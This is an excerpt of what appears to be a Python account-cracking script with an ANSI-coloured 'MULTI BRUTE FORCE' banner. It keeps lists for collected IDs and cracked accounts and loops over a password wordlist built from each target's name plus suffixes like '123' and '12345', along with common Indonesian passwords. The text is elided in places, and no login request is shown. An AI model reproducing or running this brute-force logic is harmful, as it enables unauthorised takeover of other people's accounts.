...
\033[1;96m JANCOK \033[1;95m MULTI \033[1;93m BRUTE \033[1;97m FORCE
\033[0;93m  •••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m       RIZKY \033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT 
\033[0;96m [][][][][][][][][][][][][][[]][[]][[]][[]][[]][[]]""""")
id = []
cp = []
ok = []
...
def rizz_ganteng():
	...
	def main(arg):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'freefire', 'indonesia', 'rahasia', 'anjing']:
